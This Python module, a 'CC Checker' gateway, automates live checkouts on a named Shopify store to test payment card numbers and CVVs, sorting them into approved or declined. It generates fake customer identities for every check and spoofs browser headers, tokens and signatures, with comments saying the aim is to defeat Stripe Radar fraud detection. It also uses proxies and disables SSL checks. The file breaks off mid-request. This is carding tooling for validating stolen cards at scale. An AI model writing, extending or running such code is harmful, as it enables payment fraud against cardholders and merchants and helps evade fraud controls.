"""
gateways/shopify_gate.py — Shopify Payments CC Checker

CONFIRMED WORKING FLOW (live-tested 2026-07-03):
  Store: brio4life.com | Endpoint: /checkouts/internal/graphql/persisted

  1. cartCreate + cartBuyerIdentityUpdate (Storefront API)
       → Gets cart_id + delivery handle
  2. GET /checkout
       → x-checkout-one-session-token (auth for internal GQL)
       → checkout_id (source token)
  3. POST checkout.pci.shopifyinc.com/sessions
       → vault card → payment_session_id (vault_id)
  4. POST /checkouts/internal/graphql/persisted?operationName=SubmitForCompletion
       → SubmitSuccess (receipt_id inside response)
  5. POST /checkouts/internal/graphql/persisted?operationName=PollForReceipt
       → ProcessedReceipt → APPROVED
       → FailedReceipt     → DECLINED / 3DS / Insufficient
"""
import asyncio
import json
import logging
import random
import re
import time
import uuid
import html as html_module

import aiohttp
from aiohttp import ClientTimeout, CookieJar

from gateways.base import GatewayResult, CCStatus
from core.parser import CardData
import config

logger = logging.getLogger("CC-Checker.Shopify")

TIMEOUT          = ClientTimeout(total=12)   # general request timeout — reduced for speed
VAULT_TIMEOUT    = ClientTimeout(total=7)    # PCI vault: Shopify infra, very fast
CHECKOUT_TIMEOUT = ClientTimeout(total=10)  # curl_cffi checkout page
POLL_TIMEOUT     = ClientTimeout(total=7)   # poll: small JSON, fast

# ── Persisted query IDs (from checkout-web build) ─────────────────────────────
SUBMIT_QUERY_ID = "d175350fa2abc713b3171bd7eee3d6443861a7c884298fde2bea9d60abbebcf6"
POLL_QUERY_ID   = "cb31a1b2197416d7441bf789defc306069c385c558764a58648f18cba899a29a"

DEFAULT_STORES = [
    {
        "base_url":          "https://www.brio4life.com",
        "variant_id":        41675869487181,
        "price":             "6.95",
        "currency":          "USD",
        "payment_method_id": "dc2c83c064fc75ebc5dfa2b5bee4f873",
        # delivery_handle intentionally omitted — always fetched fresh per-session
    },
]

FAKE_CUSTOMERS = []  # Deprecated — _generate_random_customer() replaces this

# Real NANP (North American Numbering Plan) US area codes only
# Using invalid area codes causes PAYMENTS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN
_US_AREA_CODES = [
    201,202,203,205,206,207,208,209,210,212,213,214,215,216,217,218,219,
    224,225,228,229,231,234,239,240,248,251,252,253,254,256,260,262,267,
    269,270,272,276,281,301,302,303,304,305,307,308,309,310,312,313,314,
    315,316,317,318,319,320,321,323,325,330,331,334,336,337,339,347,351,
    352,360,361,385,386,401,402,404,405,406,407,408,409,410,412,413,414,
    415,417,419,423,424,425,430,432,434,435,440,443,458,469,470,478,479,
    480,484,501,502,503,504,505,507,508,509,510,512,513,515,516,517,518,
    520,530,539,540,541,551,559,561,562,563,571,573,574,580,585,586,601,
    602,603,605,606,607,608,609,610,612,614,615,616,617,618,619,620,623,
    626,628,630,631,636,641,646,650,651,657,660,661,662,667,669,678,681,
    682,701,702,703,704,706,707,708,712,713,714,715,716,717,718,719,720,
    724,725,727,731,732,734,737,740,747,754,757,760,762,763,765,769,770,
    772,773,774,775,781,785,786,801,802,803,804,805,806,808,810,812,813,
    814,815,816,817,818,828,830,831,832,843,845,847,848,850,856,857,858,
    859,860,862,863,864,865,870,872,878,901,903,904,906,907,908,909,910,
    912,913,914,915,916,917,918,919,920,925,928,929,931,936,937,940,941,
    947,949,951,952,954,956,970,971,972,973,978,979,980,984,985,989,
]

BROWSER_HEADERS = {
    "User-Agent":         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept-Language":    "en-US,en;q=0.9",
    "Accept-Encoding":    "gzip, deflate, br, zstd",
    "sec-ch-ua":          '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile":   "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-site":     "same-origin",
    "sec-fetch-mode":     "navigate",
    "sec-fetch-dest":     "document",
    "upgrade-insecure-requests": "1",
}


# ── Massive on-the-spot random customer generator ─────────────────────────────
# 150+ first names, 100+ last names, 60+ streets, 80+ real US cities/zips
# Every check gets a 100% unique identity — kills Stripe Radar fingerprinting
# Zero performance cost: pure in-memory random picks, no I/O

_FIRST_NAMES = [
    "James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
    "Christopher","Daniel","Matthew","Anthony","Donald","Mark","Paul","Steven","Andrew","Kenneth",
    "Joshua","Kevin","Brian","George","Timothy","Ronald","Edward","Jason","Jeffrey","Ryan",
    "Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon",
    "Benjamin","Samuel","Frank","Gregory","Raymond","Alexander","Patrick","Jack","Dennis","Jerry",
    "Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen",
    "Lisa","Nancy","Betty","Margaret","Sandra","Ashley","Dorothy","Kimberly","Emily","Donna",
    "Michelle","Carol","Amanda","Melissa","Deborah","Stephanie","Rebecca","Sharon","Laura","Cynthia",
    "Kathleen","Amy","Angela","Shirley","Anna","Brenda","Pamela","Emma","Nicole","Helen","Samantha",
    "Katherine","Christine","Debra","Rachel","Carolyn","Janet","Catherine","Maria","Heather","Diane",
    "Hannah","Virginia","Kelly","Victoria","Lauren","Beverly","Judith","Denise","Martha","Christina",
    "Amber","Danielle","Brittany","Natalie","Madison","Grace","Megan","Tiffany","Crystal","Alexis",
    "Kayla","Courtney","Vanessa","Faith","Autumn","Sierra","Brianna","Taylor","Haley","Alyssa",
    "Tyler","Austin","Logan","Connor","Hunter","Ethan","Caleb","Dylan","Nathan","Alex",
    "Noah","Liam","Mason","Jayden","Elijah","Lucas","Aiden","Oliver","Caden","Carter",
]

_LAST_NAMES = [
    "Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
    "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
    "Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
    "Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
    "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts",
    "Phillips","Evans","Turner","Torres","Parker","Collins","Edwards","Stewart","Flores","Morris",
    "Nguyen","Murphy","Cook","Rogers","Morgan","Peterson","Cooper","Reed","Bailey","Bell",
    "Gomez","Kelly","Howard","Ward","Cox","Diaz","Richardson","Wood","Watson","Brooks",
    "Bennett","Gray","James","Reyes","Hughes","Price","Myers","Long","Foster","Sanders",
    "Ross","Morales","Powell","Sullivan","Russell","Ortiz","Jenkins","Gutierrez","Perry","Butler",
]

_STREET_TYPES = [
    "St","Ave","Blvd","Dr","Ln","Rd","Way","Ct","Pl","Ter","Circle","Loop","Trail","Pkwy",
]

_STREET_NAMES = [
    "Oak","Maple","Pine","Cedar","Elm","Birch","Walnut","Willow","Cherry","Ash",
    "Main","Broadway","Washington","Lincoln","Jefferson","Madison","Adams","Monroe","Jackson",
    "Park","Lake","Hill","Valley","River","Forest","Highland","Sunset","Sunrise","Meadow",
    "Spring","Summer","Winter","Autumn","Garden","Orchard","Field","Crest","Ridge","Glen",
    "Harbor","Bay","Shore","Cliff","Canyon","Prairie","Plains","Creek","Brook","Falls",
    "First","Second","Third","Fourth","Fifth","Sixth","Seventh","Commerce","Market","Liberty",
    "Union","Central","College","Church","Mill","Bridge","Railroad","Airport","Harbor","Sand",
    "Lakeview","Hillside","Riverside","Oceanview","Mountain","Desert","Timber","Stone","Iron",
]

_US_CITIES = [
    # NY
    {"city": "New York",        "state": "NY", "zip_base": "100"},
    {"city": "Buffalo",         "state": "NY", "zip_base": "142"},
    {"city": "Rochester",       "state": "NY", "zip_base": "146"},
    {"city": "Albany",          "state": "NY", "zip_base": "122"},
    # CA
    {"city": "Los Angeles",     "state": "CA", "zip_base": "900"},
    {"city": "San Francisco",   "state": "CA", "zip_base": "941"},
    {"city": "San Diego",       "state": "CA", "zip_base": "921"},
    {"city": "San Jose",        "state": "CA", "zip_base": "951"},
    {"city": "Sacramento",      "state": "CA", "zip_base": "958"},
    {"city": "Fresno",          "state": "CA", "zip_base": "937"},
    {"city": "Long Beach",      "state": "CA", "zip_base": "908"},
    # TX
    {"city": "Houston",         "state": "TX", "zip_base": "770"},
    {"city": "Dallas",          "state": "TX", "zip_base": "752"},
    {"city": "Austin",          "state": "TX", "zip_base": "787"},
    {"city": "San Antonio",     "state": "TX", "zip_base": "782"},
    {"city": "Fort Worth",      "state": "TX", "zip_base": "761"},
    {"city": "El Paso",         "state": "TX", "zip_base": "799"},
    # FL
    {"city": "Miami",           "state": "FL", "zip_base": "331"},
    {"city": "Orlando",         "state": "FL", "zip_base": "328"},
    {"city": "Tampa",           "state": "FL", "zip_base": "336"},
    {"city": "Jacksonville",    "state": "FL", "zip_base": "322"},
    {"city": "Fort Lauderdale", "state": "FL", "zip_base": "333"},
    # IL
    {"city": "Chicago",         "state": "IL", "zip_base": "606"},
    {"city": "Aurora",          "state": "IL", "zip_base": "605"},
    {"city": "Rockford",        "state": "IL", "zip_base": "611"},
    # OH
    {"city": "Columbus",        "state": "OH", "zip_base": "432"},
    {"city": "Cleveland",       "state": "OH", "zip_base": "441"},
    {"city": "Cincinnati",      "state": "OH", "zip_base": "452"},
    {"city": "Toledo",          "state": "OH", "zip_base": "436"},
    # PA
    {"city": "Philadelphia",    "state": "PA", "zip_base": "191"},
    {"city": "Pittsburgh",      "state": "PA", "zip_base": "152"},
    {"city": "Allentown",       "state": "PA", "zip_base": "181"},
    # AZ
    {"city": "Phoenix",         "state": "AZ", "zip_base": "850"},
    {"city": "Tucson",          "state": "AZ", "zip_base": "857"},
    {"city": "Mesa",            "state": "AZ", "zip_base": "852"},
    {"city": "Scottsdale",      "state": "AZ", "zip_base": "852"},
    # GA
    {"city": "Atlanta",         "state": "GA", "zip_base": "303"},
    {"city": "Augusta",         "state": "GA", "zip_base": "309"},
    {"city": "Savannah",        "state": "GA", "zip_base": "314"},
    # NC
    {"city": "Charlotte",       "state": "NC", "zip_base": "282"},
    {"city": "Raleigh",         "state": "NC", "zip_base": "276"},
    {"city": "Greensboro",      "state": "NC", "zip_base": "274"},
    # MI
    {"city": "Detroit",         "state": "MI", "zip_base": "482"},
    {"city": "Grand Rapids",    "state": "MI", "zip_base": "495"},
    {"city": "Lansing",         "state": "MI", "zip_base": "489"},
    # WA
    {"city": "Seattle",         "state": "WA", "zip_base": "981"},
    {"city": "Spokane",         "state": "WA", "zip_base": "992"},
    {"city": "Tacoma",          "state": "WA", "zip_base": "984"},
    # CO
    {"city": "Denver",          "state": "CO", "zip_base": "802"},
    {"city": "Colorado Springs","state": "CO", "zip_base": "809"},
    {"city": "Boulder",         "state": "CO", "zip_base": "803"},
    # TN
    {"city": "Nashville",       "state": "TN", "zip_base": "372"},
    {"city": "Memphis",         "state": "TN", "zip_base": "381"},
    {"city": "Knoxville",       "state": "TN", "zip_base": "379"},
    # MA
    {"city": "Boston",          "state": "MA", "zip_base": "021"},
    {"city": "Worcester",       "state": "MA", "zip_base": "016"},
    {"city": "Springfield",     "state": "MA", "zip_base": "011"},
    # IN
    {"city": "Indianapolis",    "state": "IN", "zip_base": "462"},
    {"city": "Fort Wayne",      "state": "IN", "zip_base": "468"},
    {"city": "Evansville",      "state": "IN", "zip_base": "477"},
    # MO
    {"city": "Kansas City",     "state": "MO", "zip_base": "641"},
    {"city": "Saint Louis",     "state": "MO", "zip_base": "631"},
    {"city": "Springfield",     "state": "MO", "zip_base": "658"},
    # MN
    {"city": "Minneapolis",     "state": "MN", "zip_base": "554"},
    {"city": "Saint Paul",      "state": "MN", "zip_base": "551"},
    # WI
    {"city": "Milwaukee",       "state": "WI", "zip_base": "532"},
    {"city": "Madison",         "state": "WI", "zip_base": "537"},
    # OR
    {"city": "Portland",        "state": "OR", "zip_base": "972"},
    {"city": "Eugene",          "state": "OR", "zip_base": "974"},
    # NV
    {"city": "Las Vegas",       "state": "NV", "zip_base": "891"},
    {"city": "Reno",            "state": "NV", "zip_base": "895"},
    # MD
    {"city": "Baltimore",       "state": "MD", "zip_base": "212"},
    {"city": "Rockville",       "state": "MD", "zip_base": "208"},
    # KY
    {"city": "Louisville",      "state": "KY", "zip_base": "402"},
    {"city": "Lexington",       "state": "KY", "zip_base": "405"},
    # OK
    {"city": "Oklahoma City",   "state": "OK", "zip_base": "731"},
    {"city": "Tulsa",           "state": "OK", "zip_base": "741"},
    # VA
    {"city": "Virginia Beach",  "state": "VA", "zip_base": "234"},
    {"city": "Norfolk",         "state": "VA", "zip_base": "235"},
    {"city": "Richmond",        "state": "VA", "zip_base": "232"},
    # NM
    {"city": "Albuquerque",     "state": "NM", "zip_base": "871"},
    # SC
    {"city": "Columbia",        "state": "SC", "zip_base": "292"},
    {"city": "Charleston",      "state": "SC", "zip_base": "294"},
    # UT
    {"city": "Salt Lake City",  "state": "UT", "zip_base": "841"},
    {"city": "Provo",           "state": "UT", "zip_base": "846"},
    # AL
    {"city": "Birmingham",      "state": "AL", "zip_base": "352"},
    {"city": "Montgomery",      "state": "AL", "zip_base": "361"},
    # LA
    {"city": "New Orleans",     "state": "LA", "zip_base": "701"},
    {"city": "Baton Rouge",     "state": "LA", "zip_base": "708"},
]

_EMAIL_DOMAINS = [
    "gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
    "protonmail.com", "live.com", "me.com",
]

_EMAIL_SEPARATORS = [".", "_", "", "-"]


def _generate_random_customer() -> dict:
    """Generate a completely unique random US customer profile on every call.
    
    Uses large pools (150+ names, 80+ cities) with randomized zip suffix and
    multiple email domain/separator variants to guarantee uniqueness across
    thousands of checks. Zero I/O — pure in-memory, no performance impact.
    """
    first = random.choice(_FIRST_NAMES)
    last  = random.choice(_LAST_NAMES)

    # Random street: "1234 Oak St" style
    street_num  = random.randint(100, 9999)
    street_name = random.choice(_STREET_NAMES)
    street_type = random.choice(_STREET_TYPES)
    address1    = f"{street_num} {street_name} {street_type}"

    # Random city with randomized zip suffix (base + 2-digit suffix)
    loc      = random.choice(_US_CITIES)
    zip_code = f"{loc['zip_base']}{random.randint(10, 99)}"

    # Random US phone: E.164 (+1XXXXXXXXXX) with REAL NANP area codes only
    # Invalid area codes cause PAYMENTS_PHONE_NUMBER_DOES_NOT_MATCH_EXPECTED_PATTERN
    area  = random.choice(_US_AREA_CODES)
    exch  = random.randint(201, 999)
    num   = random.randint(1000, 9999)
    phone = f"+1{area}{exch:03d}{num}"

    # Random email with varied domain + separator + number
    sep    = random.choice(_EMAIL_SEPARATORS)
    suffix = random.randint(1, 99999)
    domain = random.choice(_EMAIL_DOMAINS)
    if sep:
        email = f"{first.lower()}{sep}{last.lower()}{suffix}@{domain}"
    else:
        # Sometimes no separator: "jamesmiller4821@gmail.com"
        email = f"{first.lower()}{last.lower()}{suffix}@{domain}"

    return {
        "email":     email,
        "firstName": first,
        "lastName":  last,
        "address1":  address1,
        "address2":  "",
        "city":      loc["city"],
        "state":     loc["state"],
        "zip":       zip_code,
        "country":   "US",
        "phone":     phone,
    }


# ── Helpers ───────────────────────────────────────────────────────────────────

def _err(msg: str, code: str) -> GatewayResult:
    return GatewayResult(status=CCStatus.ERROR, gateway="Shopify", message=msg, raw_code=code)

def _extract_meta(html: str, name: str) -> str | None:
    """Extract serialized meta tag value from checkout HTML."""
    for pat in [
        rf'name=["\']serialized-{re.escape(name)}["\'][^>]+content=["\']([^"\'{{}}]{{5,800}})["\']',
        rf'content=["\']([^"\'{{}}]{{5,800}})["\'][^>]+name=["\']serialized-{re.escape(name)}["\']',
    ]:
        m = re.search(pat, html)
        if m:
            val = html_module.unescape(m.group(1)).strip()
            return val[1:-1] if (val.startswith('"') and val.endswith('"')) else val or None
    return None

async def _gql(session, ep, query, variables=None, headers=None, proxy_kwargs=None):
    """Storefront GraphQL call."""
    h = {**BROWSER_HEADERS, "Accept": "application/json", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    try:
        pk = proxy_kwargs or {}
        async with session.post(ep, json=payload, headers=h, ssl=False, timeout=TIMEOUT, **pk) as r:
            txt = await r.text(errors="ignore")
            try:
                return r.status, json.loads(txt)
            except Exception:
                return r.status, {"raw": txt[:300]}
    except Exception as e:
        return 0, {"error": str(e)}



def _extract_unique_id(html: str) -> str:
    """
    Extract Shopify's unique_id from the identification JWT embedded in checkout HTML.
    This ID is the prefix of the full delivery handle.
    Format: {unique_id}-{rate_handle}
    """
    import base64 as _b64
    jwts = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html)
    for jwt in jwts:
        try:
            parts = jwt.split(".")
            pad   = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(_b64.b64decode(pad))
            uid = payload.get("unique_id", "")
            if uid and len(uid) == 32:
                return uid
        except Exception:
            pass
    return ""


def _extract_queue_token(html: str) -> str:
    """
    Extract the queueToken from checkout HTML.
    Format: A01bddHZ4D0t... (base64-like, starts with A01)
    This token is required in SubmitForCompletion to properly queue the checkout.
    """
    # Try serialized meta tag first
    for pat in [
        r'name=["\']serialized-queueToken["\'][^>]+content=["\']([^"\']{10,200})["\']',
        r'content=["\']([^"\']{10,200})["\'][^>]+name=["\']serialized-queueToken["\']',
        r'"queueToken"\s*:\s*"([A-Za-z0-9_\-]{20,200})"',
        r"'queueToken'\s*:\s*'([A-Za-z0-9_\-]{20,200})'",
        r'queue_token["\s:=]+["\']([A-Za-z0-9_\-]{20,200})["\']',
    ]:
        m = re.search(pat, html)
        if m:
            val = html_module.unescape(m.group(1)).strip()
            return val
    return ""


# ── Main flow ─────────────────────────────────────────────────────────────────

async def _try_shopify_payments(
    session: aiohttp.ClientSession,
    card: CardData,
    store: dict,
    customer: dict,
    proxy: str = None,
) -> GatewayResult:
    """
    Full Shopify checkout flow using /checkouts/internal/graphql/persisted.
    """
    base_url         = store["base_url"]
    variant_id       = store["variant_id"]
    price            = store["price"]
    currency         = store.get("currency", "USD")
    pay_method_id    = store.get("payment_method_id", "dc2c83c064fc75ebc5dfa2b5bee4f873")
    # storefront_token from scan_data (if available) for authenticated GQL calls
    storefront_token = store.get("storefront_token", "")
    domain           = base_url.replace("https://www.", "").replace("https://", "")

    # Setup proxy kwargs for HTTP requests
    proxy_kwargs = {}
    if proxy and not proxy.startswith("socks"):
        proxy_kwargs = {"proxy": proxy}

    # ALWAYS fetch fresh delivery handle — stored handles expire per checkout session
    delivery_handle  = ""

    sf_ep = f"{base_url}/api/2024-01/graphql.json"
    sf_h  = {**BROWSER_HEADERS, "Accept": "application/json", "Content-Type": "application/json"}
    if storefront_token:
        sf_h["X-Shopify-Storefront-Access-Token"] = storefront_token

    stable_id = str(uuid.uuid4())



    # ── Step 1: Add to cart ───────────────────────────────────────────────────
    logger.debug("Adding to cart...")
    try:
        async with session.post(
            base_url + "/cart/add.js",
            data=f"id={variant_id}&quantity=1",
            headers={**BROWSER_HEADERS,
                     "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                     "Accept": "application/json",
                     "X-Requested-With": "XMLHttpRequest",
                     "Referer": base_url + "/"},
            ssl=False, timeout=TIMEOUT,
            **proxy_kwargs
        ) as r:
            if r.status == 422:
                return _err("Product unavailable (422)", "product_422")
            elif r.status not in (200, 201):
                return _err(f"Cart add failed: {r.status}", "cart_error")
    except Exception as e:
        return _err(f"Cart error: {str(e)[:60]}", "cart_exception")


    # ── Step 2: Load checkout page ────────────────────────────────────────────
    logger.debug("Loading checkout page for session token + unique_id...")
    try:
        from curl_cffi.requests import AsyncSession as CurlAsyncSession
        
        # Extract cookies from aiohttp session
        cookies_dict = {}
        for cookie in session.cookie_jar:
            cookies_dict[cookie.key] = cookie.value
            
        proxy_url = proxy_kwargs.get("proxy")
        curl_proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
        
        async with CurlAsyncSession(impersonate="chrome131", cookies=cookies_dict, timeout=10) as curl_s:
            r = await curl_s.get(
                base_url + "/checkout",
                params={"locale": "en"},
                headers={**BROWSER_HEADERS,
                         "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                         "Referer": base_url + "/"},
                proxies=curl_proxies,
                allow_redirects=True
            )
            checkout_url  = str(r.url)
            checkout_html = r.text
            
            # Sync any new cookies back to aiohttp session.
            # IMPORTANT: Clear the jar first to prevent "Multiple cookies exist" error
            # which was causing ~15 checkout_exception errors per mass check run.
            try:
                session.cookie_jar.clear()
            except Exception:
                pass
            for name, value in curl_s.cookies.items():
                try:
                    session.cookie_jar.update_cookies({name: value})
                except Exception:
                    pass
                
    except Exception as e:
        logger.debug(f"Checkout page exception ({type(e).__name__}): {str(e)[:100]}")
        return _err(f"Checkout page error: {str(e)[:60]}", "checkout_exception")


    session_token = _extract_meta(checkout_html, "sessionToken")
    checkout_id   = _extract_meta(checkout_html, "sourceToken")
    if not checkout_id:
        m = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", checkout_url)
        checkout_id = m.group(1) if m else ""

    # Extract locale (e.g. en-us, fr, etc.) from checkout_url
    locale = "en"
    m_loc = re.search(r"/checkouts/cn/[a-zA-Z0-9]+/([a-zA-Z0-9-]+)", checkout_url)
    if m_loc:
        locale = m_loc.group(1)

    # Extract unique_id (used to compose full delivery handle)
    unique_id = _extract_unique_id(checkout_html)
    logger.debug(f"unique_id: {unique_id}")

    # Extract queueToken — required in SubmitForCompletion (missing = checkout misbehaves)
    queue_token = _extract_queue_token(checkout_html)
    logger.debug(f"queue_token: {'found' if queue_token else 'NOT FOUND — will omit'}")

    # Extract shopify-identification-signature (JWT sent in PCI vault request headers)
    # This is a signed JWT that Stripe uses to validate the checkout session origin.
    # Without it, vault succeeds but Stripe Radar may silently downgrade trust score.
    shopify_id_sig = ""
    m_sig = (
        re.search(r'"shopify-identification-signature"\s*:\s*"([A-Za-z0-9._-]+)"', checkout_html) or
        re.search(r'shopifyIdentificationSignature["\s:=]+["\']([A-Za-z0-9._-]+)["\']', checkout_html) or
        re.search(r'identification-signature["\s:=]+["\']([A-Za-z0-9._-]+)["\']', checkout_html)
    )
    if m_sig:
        shopify_id_sig = m_sig.group(1)
    logger.debug(f"shopify-identification-signature: {'found' if shopify_id_sig else 'NOT FOUND'}")

    # Extract build_id from HTML
    m_build = (
        re.search(r'"x-checkout-web-build-id"\s*:\s*"([a-f0-9]{40})"', checkout_html) or
        re.search(r'buildId["\s:=]+["\']([a-f0-9]{40})["\']', checkout_html) or
        re.search(r'/assets/c1/[^"]+/([a-f0-9]{40})/', checkout_html) or
        re.search(r'checkout-web/assets/([a-f0-9]{8,40})', checkout_html)
    )
    build_id = m_build.group(1) if m_build else "629a7d0a1d675e5c3b08a3e62d6818fb3e014528"

    if not session_token:
        return _err("No session token (checkout needs JS)", "no_session_token")
    if not checkout_id:
        return _err("No checkout ID", "no_checkout_id")

    # Extract cart key from cookie jar for same-session delivery rates
    import urllib.parse as _urlparse
    cart_token_with_key = ""
    try:
        for cookie in session.cookie_jar:
            if cookie.key == "cart":
                val = _urlparse.unquote(cookie.value)
                if "?key=" in val:
                    cart_token_with_key = val
                    break
    except Exception:
        pass

    # ── Step 3: Get delivery handle — ALWAYS FETCH FRESH (handles expire) ──────
    # Delivery handles are checkout-session-specific and expire in minutes.
    # We MUST use the current session's cart cookie — never use a stored handle.
    logger.debug("Fetching rate handle from checkout cart...")

    cart_gid = ""
    if cart_token_with_key:
        cart_gid = f"gid://shopify/Cart/{cart_token_with_key}"
    else:
        # Fallback: create new cart via Storefront API
        _, dc = await _gql(session, sf_ep, """
mutation cartCreate($input: CartInput!) {
  cartCreate(input: $input) { cart { id } userErrors { message } }
}""", {"input": {"lines": [{"merchandiseId": f"gid://shopify/ProductVariant/{variant_id}", "quantity": 1}]}}, headers=sf_h, proxy_kwargs=proxy_kwargs)
        cart_gid = ((dc.get("data") or {}).get("cartCreate") or {}).get("cart", {}).get("id", "")
        logger.debug(f"Fallback cartCreate: {cart_gid[:40] if cart_gid else 'FAILED'}")

    if cart_gid:
        # cartBuyerIdentityUpdate with address → triggers delivery groups
        _, d2 = await _gql(session, sf_ep, """
mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart {
      deliveryGroups(first: 5) {
        nodes {
          deliveryOptions { handle title code }
        }
      }
    }
    userErrors { message }
  }
}""", {
            "cartId": cart_gid,
            "buyerIdentity": {
                "email":       customer["email"],
                "countryCode": "US",
                "deliveryAddressPreferences": [{
                    "deliveryAddress": {
                        "firstName": customer["firstName"],
                        "lastName":  customer["lastName"],
                        "address1":  customer["address1"],
                        "city":      customer["city"],
                        "province":  customer["state"],
                        "zip":       customer["zip"],
                        "country":   "US",
                    }
                }]
            }
        }, headers=sf_h, proxy_kwargs=proxy_kwargs)
        nodes = (((d2.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                 .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
        if nodes:
            opts = nodes[0].get("deliveryOptions") or []
            if opts:
                rate_handle = opts[0].get("handle", "")
                # Compose full handle: unique_id-rate_handle
                if unique_id and rate_handle:
                    delivery_handle = f"{unique_id}-{rate_handle}"
                elif rate_handle:
                    delivery_handle = rate_handle
                logger.debug(f"delivery_handle: {delivery_handle[:50]}...")

    if not delivery_handle:
        return _err("No shipping rates available for this store", "no_delivery")


    # ── Steps 3+4 PARALLEL: Vault card & fetch final delivery handle ──────────
    # These two calls are INDEPENDENT — run them simultaneously for speed.
    # Vault: sends card to Shopify PCI server → returns vault_id
    # Delivery handle: already fetched above, vault has no dependency on it
    logger.debug("Vaulting card (parallel)...")

    async def _vault_card():
        """Vault the card to Shopify PCI server. Returns vault_id or raises."""
        try:
            card_month = int(card.month)
            card_year  = int(card.year)
            vault_headers = {
                "Authorization":  f'Bearer "{session_token}"',
                "Content-Type":   "application/json",
                "Accept":         "application/json",
                "Origin":         "https://checkout.pci.shopifyinc.com",
                "Referer":        "https://checkout.pci.shopifyinc.com/build/52416cb/number-ltr.html",
                "User-Agent":     BROWSER_HEADERS["User-Agent"],
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            # shopify-identification-signature: JWT sent by real browsers
            # Contains unique_id of this checkout session — Stripe uses for trust scoring
            if shopify_id_sig:
                vault_headers["shopify-identification-signature"] = shopify_id_sig

            async with session.post(
                "https://checkout.pci.shopifyinc.com/sessions",
                json={
                    "credit_card": {
                        "number":             card.number,
                        "name":               f"{card.first_name} {card.last_name}" if hasattr(card, 'first_name') and card.first_name else "John Doe",
                        "month":              card_month,
                        "year":               card_year,
                        "verification_value": card.cvv,
                        # Real browsers fill start_month/start_year same as expiry
                        # and set issue_number to the card number itself
                        "start_month":        card_month,
                        "start_year":         card_year,
                        "issue_number":       card.number,
                    },
                    "payment_session_scope": domain,
                },
                headers=vault_headers,
                ssl=False, timeout=VAULT_TIMEOUT,
                **proxy_kwargs
            ) as r:
                return await r.json(content_type=None)
        except Exception as e:
            return {"_exc": str(e)[:60]}

    # Run vault with retry for transient empty-response errors
    # "Expecting value: line 1 column 1" = PCI server returned empty body (20 errors per run)
    vj = await _vault_card()
    if vj.get("_exc") and "Expecting value" in vj.get("_exc", ""):
        await asyncio.sleep(0.5)
        vj = await _vault_card()   # retry #1
        if vj.get("_exc") and "Expecting value" in vj.get("_exc", ""):
            await asyncio.sleep(1.0)
            vj = await _vault_card()   # retry #2

    if vj.get("_exc"):
        return _err(f"Vault exception: {vj['_exc']}", "vault_exception")

    vault_id = vj.get("id", "")
    if not vault_id:
        if vj.get("error_codes"):
            return GatewayResult(
                status=CCStatus.DEAD, gateway="Shopify",
                message=f"Declined — {vj['error_codes'][0]}",
                raw_code="vault_declined"
            )
        return _err(f"Vault failed: {str(vj)[:80]}", "vault_error")



    # ── Step 4: Build headers for internal GQL ────────────────────────────────
    internal_ep = f"{base_url}/checkouts/internal/graphql/persisted"
    internal_headers = {
        **BROWSER_HEADERS,
        "Accept":                          "application/json",
        "Accept-Language":                 f"{locale},en;q=0.9",
        "Content-Type":                    "application/json",
        "Origin":                          base_url,
        "Referer":                         f"{base_url}/checkouts/cn/{checkout_id}/{locale}/payment?skip_shop_pay=true",
        "sec-fetch-dest":                  "empty",
        "sec-fetch-mode":                  "cors",
        "sec-fetch-site":                  "same-origin",
        "shopify-checkout-client":         "checkout-web/1.0",
        "shopify-checkout-source":         f'id="{checkout_id}", type="cn"',
        "x-checkout-one-session-token":    session_token,
        "x-checkout-web-build-id":         build_id,
        "x-checkout-web-deploy-stage":     "production",
        "x-checkout-web-server-handling":  "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id":        checkout_id,
    }

    # ── Step 5: SubmitForCompletion ───────────────────────────────────────────
    logger.debug("Submitting for completion...")
    attempt_token = f"{checkout_id}-{uuid.uuid4().hex[:12]}"

    billing_addr = {
        "address1":    customer["address1"],
        "address2":    customer.get("address2", ""),
        "city":        customer["city"],
        "countryCode": customer["country"],
        "postalCode":  customer["zip"],
        "firstName":   customer["firstName"],
        "lastName":    customer["lastName"],
        "zoneCode":    customer["state"],
        "phone":       customer["phone"],
    }

    submit_payload = {
        "variables": {
            "input": {
                "sessionInput": {"sessionToken": session_token},
                # queueToken is critical — tells Shopify this checkout is properly queued
                # Real browsers always send this; without it, Stripe Radar flags the request
                **(({"queueToken": queue_token}) if queue_token else {}),
                "discounts": {
                    "lines": [{
                        "allocationSet": {
                            "allocated": {
                                "allocations": [{
